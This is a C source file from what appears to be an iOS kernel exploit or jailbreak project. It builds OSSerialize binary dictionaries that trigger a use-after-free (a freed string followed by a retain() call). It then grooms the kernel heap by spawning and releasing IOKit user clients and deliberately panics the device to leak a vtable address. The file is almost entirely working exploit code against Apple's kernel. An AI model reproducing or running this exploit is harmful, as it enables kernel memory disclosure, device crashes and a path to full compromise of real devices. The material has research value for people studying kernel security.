#include <stdint.h>             // uint32_t
#include <unistd.h>             // sleep, sync

#include <IOKit/IOKitLib.h>     // IO*, io_*

#include "common.h"             // DEBUG
#include "io.h"                 // kOS*, dict_parse, _io_*
#include "try.h"                // THROW, TRY, RETHROW

#include "uaf_panic.h"

#define NUMSTR_PLUG 255
#define NUMSTR_PAD   64
#define NUM_CLIENTS  16

#if 0
static const char *services[] =
{
    //"ASP",
    //"AppleAVE",
    //"AppleBCMWLAN",
    "AppleBaseband",
    "AppleCredentialManager",
    "AppleEffaceableStorage",
    "AppleJPEGDriver",
    "AppleKeyStore",
    "AppleMobileFileIntegrity",
    //"AppleNANDFTL",
    "AppleSPUHIDDriver",
    //"AppleSRSDriver",
    "AppleSSE",
    "AppleStockholmControl",
    //"AppleUSBHostInterface",
    "IOAESAccelerator",
    //"IOAVAudioInterface",
    //"IOAVController",
    //"IOAVDevice",
    //"IOAVService",
    //"IOAVVideoInterface",
    //"IOAccelShared",
    "IOAccessoryManager",
    "IOAudioCodecs",
    //"IODPAudioInterface",
    //"IODPController",
    //"IODPDevice",
    //"IODPDisplayInterface",
    //"IODPService",
    //"IOHIDLib",
    //"IOHIDResourceDevice",
    "IOMobileFramebuffer",
    //"IOReport",
    //"IOStreamAudio",
    "IOSurfaceRoot",
    "IOUSBDeviceInterface",
    "IOUserEthernetResource",
    "ProvInfoIOKit",
    //"RootDomain",
    "com_apple_audio_IOBorealisOwl",
    "com_apple_driver_FairPlayIOKit",
    //"mDNSOffload",
    //"wlDNSOffload",
};
#endif

void uaf_panic_leak_vtab()
{
    DEBUG("Using UAF to (panic-)leak vtable...");

    const char str[4] = "str";
    uint32_t
    // The trigger
    dict[5] =
    {
        kOSSerializeMagic,                                              // Magic
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,         // Dictionary with 2 entries

        kOSSerializeString | 4,                                         // String that'll get freed
        *((uint32_t*)str),
        kOSSerializeEndCollection | kOSSerializeObject | 1,             // Call ->retain() on the freed string
    },
    // the slot for the trigger
    dict_hole[6] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 2,

        kOSSerializeSymbol | 4,
        *((uint32_t*)str),
        kOSSerializeEndCollection | kOSSerializeString | 4,
        *((uint32_t*)str),
    },
    // to plug the existing holes on the heap
    dict_plug[2 + NUMSTR_PLUG * 4] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | (2 * NUMSTR_PLUG),
    },
    // to get an OSString next to our hole
    dict_pad[2 + NUMSTR_PAD * 4] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | (2 * NUMSTR_PAD),
    };
    for(uint32_t i = 0; i < NUMSTR_PLUG; ++i)
    {
        dict_plug[2 + i * 4    ] = kOSSerializeSymbol | 4;
        dict_plug[2 + i * 4 + 1] = i;
        dict_plug[2 + i * 4 + 2] = kOSSerializeString | 4;
        dict_plug[2 + i * 4 + 3] = i;
        if(i + 1 == NUMSTR_PLUG)
        {
            dict_plug[2 + i * 4 + 2] |= kOSSerializeEndCollection;
        }
    }
    for(uint32_t i = 0; i < NUMSTR_PAD; ++i)
    {
        dict_pad[2 + i * 4    ] = kOSSerializeSymbol | 4;
        dict_pad[2 + i * 4 + 1] = i;
        dict_pad[2 + i * 4 + 2] = kOSSerializeString | 4;
        dict_pad[2 + i * 4 + 3] = i;
        if(i + 1 == NUMSTR_PAD)
        {
            dict_pad[2 + i * 4 + 2] |= kOSSerializeEndCollection;
        }
    }
    PRINT_BUF("dict     ", dict,      sizeof(dict));
    PRINT_BUF("dict_hole", dict_hole, sizeof(dict));
    PRINT_BUF("dict_plug", dict_plug, sizeof(dict));
    PRINT_BUF("dict_pad ", dict_pad,  sizeof(dict));

    DEBUG("Spawning user clients...");
    io_service_t service = _io_get_service(NULL);
    io_connect_t client_plug,
                 client_hole[NUM_CLIENTS],
                 client_pad [NUM_CLIENTS];

    DEBUG("Plugging existing heap holes...");
    client_plug = _io_spawn_client(service, dict_plug, sizeof(dict_plug));

    DEBUG("Allocating (hopefully) contiguous memory...");
    for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
    {
        TRY
        ({
            client_hole[i] = _io_spawn_client(service, dict_hole, sizeof(dict_hole));
            TRY
            ({
                client_pad[i] = _io_spawn_client(service, dict_pad , sizeof(dict_pad));
            })
            RETHROW
            ({
                _io_release_client(client_hole[i]);
            })
        })
        RETHROW
        ({
            for(; i > 0; --i) // Can't use >= 0 because unsigned
            {
                _io_release_client(client_hole[i - 1]);
                _io_release_client(client_hole[i - 1]);
            }
        })
    }

    DEBUG("Poking holes...");
    // This is equivalent to cleanup, so no try blocks
    for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
    {
        _io_release_client(client_hole[i]);
    }

    DEBUG("Fire in the hole! (This should panic.)");
    // Write everything to disk
    sync();
    // Allow SSH to deliver latest output
    sleep(1);

    TRY
    ({
        dict_parse(dict, sizeof(dict));
    })
    RETHROW
    ({
        for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
        {
            _io_release_client(client_pad[i]);
        }
        _io_release_client(client_plug);
    })
    DEBUG("...shit, we're still here.");

    DEBUG("Releasing remaining clients...");
    // No try blocks around cleanup
    for(uint32_t i = 0; i < NUM_CLIENTS; ++i)
    {
        _io_release_client(client_pad[i]);
    }
    _io_release_client(client_plug);
}
